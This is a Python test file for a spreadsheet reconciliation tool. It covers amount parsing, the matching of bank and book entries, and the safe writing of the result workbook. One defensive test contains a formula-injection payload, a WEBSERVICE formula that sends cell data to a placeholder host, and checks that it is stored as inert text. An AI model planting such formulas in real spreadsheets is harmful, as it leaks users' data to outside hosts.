"""The review of matching two lists (v1.469.0, documents/excel_reconcile).

Each test here was red on the first cut:

* an amount written with a comma that is not a thousands comma ("1,23",
  "1.234,50") was read as a different number; it is now left out and SAID;
* "$ (12.00)" and "- 12.00" (ordinary spaces) were not read at all;
* a number too large to be an amount raised instead of being left out;
* a reference that repeats ("ACH" every month) paired rows months apart and
  named the wrong month as missing;
* the tolerance paired a deposit with a withdrawal;
* text from a list that starts with "=" became a live formula in the result
  workbook;
* a list name with a slash stopped the result workbook from being written;
* rows with no readable date, a total line counted as a transaction, and a
  money-out column written in negative numbers were not said.
"""

from __future__ import annotations

import asyncio
import datetime as dt
from pathlib import Path
from types import SimpleNamespace

import pytest
from openpyxl import Workbook, load_workbook

from iron_jarvis.documents import excel_reconcile as R
from iron_jarvis.tools.base import ToolContext

D = dt.date


def _side(name: str, rows, *, dated=True, refs=False) -> R.Side:
    side = R.Side(name=name, sheet=name, has_date=dated, has_ref=refs)
    for i, row in enumerate(rows):
        cents, date, ref = (list(row) + [None, ""])[:3]
        side.rows.append(R.Txn(row=i + 2, cents=cents, date=date, ref=R.norm_ref(ref)))
    return side


def _ctx(ws: Path) -> ToolContext:
    return ToolContext(workspace=ws, session_id="s", agent_run_id="r", config=SimpleNamespace(home=ws), event_bus=None, engine=None)


# -------------------------------------------------------------------- cents --


@pytest.mark.parametrize(
    "cell",
    ["1,23", "1.234,50", "12,34.50", "1234,567", "1,2,3", "1 234,50"],
)
def test_a_comma_that_is_not_a_thousands_comma_is_never_read_as_a_number(cell):
    assert R.to_cents(cell) is None, "a wrong amount is worse than a row left out and said"


@pytest.mark.parametrize(
    ("cell", "cents"),
    [
        ("1,234", 123400), ("1,234,567.89", 123456789), ("-1,234.5", -123450), ("(1,234.50)", -123450),
        ("$ (12.00)", -1200), ("- 12.00", -1200), ("$ 1,234.50", 123450), ("( 12.00 )", -1200),
        ("12.00 ", 1200), ("1 234.50", 123450), ("12.00 -", -1200), ("5e2", 50000), ("+5", 500),
    ],
)
def test_amounts_are_read_the_way_accounting_formats_write_them(cell, cents):
    assert R.to_cents(cell) == cents


@pytest.mark.parametrize("cell", [1e30, "1e400", "9" * 40, -1e22])
def test_a_number_too_large_to_be_an_amount_is_left_out_not_raised(cell):
    assert R.to_cents(cell) is None


# ----------------------------------------------------------------- matching --


def test_a_reference_that_repeats_never_pairs_rows_outside_the_date_window():
    """Rent by ACH on the 1st of each month; the books miss MARCH. The first
    cut paired March with April, April with May... and said December was the
    one missing."""
    months = range(1, 13)
    a = _side("Bank", [(-200000, D(2026, m, 1), "ACH") for m in months], refs=True)
    b = _side("Books", [(-200000, D(2026, m, 1), "ACH") for m in months if m != 3], refs=True)
    res = R.match(a, b, days=5)
    assert [t.date for t in res.only_a] == [D(2026, 3, 1)], "the month really missing is the one left over"
    assert res.only_b == [] and len(res.matches) == 11
    assert all(m.days == 0 for m in res.matches)


def test_a_reference_seen_once_on_each_side_still_matches_whatever_the_dates():
    a = _side("Bank", [(-8000, D(2026, 10, 5), "1002")], refs=True)
    b = _side("Books", [(-8000, D(2026, 7, 1), "#1002")], refs=True)
    assert [(m.how, m.days) for m in R.match(a, b).matches] == [("reference", 96)]


def test_a_repeating_reference_with_no_dates_matches_in_row_order():
    a = _side("A", [(100, None, "x"), (100, None, "x")], dated=False, refs=True)
    b = _side("B", [(100, None, "x")], dated=False, refs=True)
    res = R.match(a, b)
    assert [(m.a.row, m.b.row, m.how) for m in res.matches] == [(2, 2, "reference")]
    assert [t.row for t in res.only_a] == [3]


def test_the_tolerance_never_pairs_money_in_with_money_out():
    a = _side("Bank", [(250, D(2026, 1, 1))])
    b = _side("Books", [(-250, D(2026, 1, 1))])
    res = R.match(a, b, tolerance_cents=500)
    assert res.matches == [] and len(res.only_a) == 1 and len(res.only_b) == 1
    # A zero beside a few cents is still a pair.
    a0, b0 = _side("Bank", [(0, D(2026, 1, 1))]), _side("Books", [(-3, D(2026, 1, 1))])
    assert len(R.match(a0, b0, tolerance_cents=5).matches) == 1


# ---------------------------------------------------------------- the lists --


def _write(path: Path, rows, title="L") -> None:
    wb = Workbook()
    ws = wb.active
    ws.title = title
    for r in rows:
        ws.append(list(r))
    wb.save(path)


def test_an_amount_that_could_not_be_read_is_said_with_its_row(tmp_path):
    _write(tmp_path / "a.xlsx", [("Date", "Amount"), (D(2026, 1, 1), 100), (D(2026, 1, 2), "1,23"), (D(2026, 1, 3), None),
                                 (D(2026, 1, 4), "n/a")])
    _write(tmp_path / "b.xlsx", [("Date", "Amount"), (D(2026, 1, 1), 100)])
    res = asyncio.run(R.ExcelReconcileTool().execute(
        {"a": {"path": "a.xlsx", "amount": "Amount", "date": "Date"}, "b": {"path": "b.xlsx", "amount": "Amount", "date": "Date"}},
        _ctx(tmp_path)))
    assert res.ok, res.error
    assert "A: 1 rows, total 100.00" in res.output.replace(" (L)", "")
    assert "2 row(s) of A hold something in the amount column that could not be read as an amount" in res.output
    assert 'row 3: "1,23"' in res.output and 'row 5: "n/a"' in res.output
    assert "1 row(s) of A hold no amount and were left out." in res.output, "an empty amount cell is said apart"


def test_rows_with_no_readable_date_are_said(tmp_path):
    _write(tmp_path / "a.xlsx", [("Date", "Amount"), ("13/01/2026", 100), (D(2026, 1, 2), 200)])
    _write(tmp_path / "b.xlsx", [("Date", "Amount"), (D(2026, 1, 1), 100), (D(2026, 1, 2), 200)])
    res = asyncio.run(R.ExcelReconcileTool().execute(
        {"a": {"path": "a.xlsx", "amount": "Amount", "date": "Date"}, "b": {"path": "b.xlsx", "amount": "Amount", "date": "Date"}},
        _ctx(tmp_path)))
    assert res.ok and "Matched: 1 pairs" in res.output
    assert "1 row(s) of A have no date that could be read, so they could not be matched by date (row 2)" in res.output


def test_a_total_line_is_noticed_and_can_be_left_out(tmp_path):
    rows = [("Date", "Amount"), (D(2026, 1, 1), 100), (D(2026, 1, 2), 250.5), (D(2026, 1, 3), -20), ("Total", 330.5)]
    _write(tmp_path / "a.xlsx", rows)
    _write(tmp_path / "b.xlsx", rows[:4])
    spec_a = {"path": "a.xlsx", "amount": "Amount", "date": "Date"}
    spec_b = {"path": "b.xlsx", "amount": "Amount", "date": "Date"}
    res = asyncio.run(R.ExcelReconcileTool().execute({"a": spec_a, "b": spec_b}, _ctx(tmp_path)))
    assert res.ok and "row 5 of A (330.50) equals the sum of all the rows above it" in res.output
    assert "last_row: 4" in res.output
    again = asyncio.run(R.ExcelReconcileTool().execute({"a": {**spec_a, "last_row": 4}, "b": spec_b}, _ctx(tmp_path)))
    assert again.ok and "total 330.50" in again.output and "Only in A: 0 rows" in again.output
    assert "equals the sum" not in again.output


def test_money_out_written_in_negative_numbers_is_read_as_money_out_and_said(tmp_path):
    _write(tmp_path / "bank.xlsx", [("Date", "In", "Out"), (D(2026, 1, 2), None, -50), (D(2026, 1, 3), 75, None), (D(2026, 1, 4), None, -20)])
    _write(tmp_path / "gl.xlsx", [("Date", "Amount"), (D(2026, 1, 2), -50), (D(2026, 1, 3), 75), (D(2026, 1, 4), -20)])
    side = R.read_side(tmp_path / "bank.xlsx", {"money_in": "In", "money_out": "Out", "date": "Date"}, "Bank")
    assert [t.cents for t in side.rows] == [-5000, 7500, -2000]
    res = asyncio.run(R.ExcelReconcileTool().execute(
        {"a": {"path": "bank.xlsx", "name": "Bank", "money_in": "In", "money_out": "Out", "date": "Date"},
         "b": {"path": "gl.xlsx", "name": "Books", "amount": "Amount", "date": "Date"}}, _ctx(tmp_path)))
    assert res.ok and "Matched: 3 pairs" in res.output
    assert "every amount in the money out column of Bank is written as a negative number" in res.output


def test_a_negative_among_positive_money_out_is_read_as_written_and_said(tmp_path):
    _write(tmp_path / "bank.xlsx", [("Date", "In", "Out"), (D(2026, 1, 2), None, 50), (D(2026, 1, 3), None, -20), (D(2026, 1, 4), 5, None)])
    side = R.read_side(tmp_path / "bank.xlsx", {"money_in": "In", "money_out": "Out", "date": "Date"}, "Bank")
    assert [t.cents for t in side.rows] == [-5000, 2000, 500]
    assert side.out_negative == [3]
    b = _side("Books", [(1, D(2026, 1, 1))])
    text = R.render(side, b, R.match(side, b), R.totals(side, b, R.match(side, b)), days=5, tolerance_cents=0)
    assert "1 row(s) of Bank hold a negative number in the money out column" in text and "(row 3)" in text


# --------------------------------------------------------- the result workbook --


def test_text_from_a_list_is_never_a_live_formula_in_the_result_workbook(tmp_path):
    evil = '=WEBSERVICE("https://example.invalid/?d="&A1)'
    a = R.Side("Bank", "='x'!A1", [R.Txn(2, 100, D(2026, 1, 1), text=evil), R.Txn(3, 7, None, text="=1+1")], has_date=True)
    b = R.Side("=Books", "GL", [R.Txn(2, 100, D(2026, 1, 1), text="=A1")], has_date=True)
    res = R.match(a, b)
    out = tmp_path / "res.xlsx"
    R.write_result(out, a, b, res, R.totals(a, b, res))
    wb = load_workbook(out)
    cells = [c for ws in wb.worksheets for row in ws.iter_rows() for c in row]
    assert not [c.coordinate for c in cells if c.data_type == "f"], "no cell of the result is a formula"
    assert evil in [c.value for c in cells], "the words are kept, as text"


def test_a_list_name_no_sheet_can_carry_still_writes_the_result(tmp_path):
    a = R.Side("Bank/Jan [x]", "s", [R.Txn(2, 100, D(2026, 1, 1))], has_date=True)
    b = R.Side("Books: *?", "s", [R.Txn(2, 100, D(2026, 1, 1))], has_date=True)
    res = R.match(a, b)
    R.write_result(tmp_path / "res.xlsx", a, b, res, R.totals(a, b, res))
    names = load_workbook(tmp_path / "res.xlsx").sheetnames
    assert len(names) == 4 and names[:2] == ["Summary", "Matched"]
    assert not any(ch in n for n in names for ch in "[]:*?/\\")
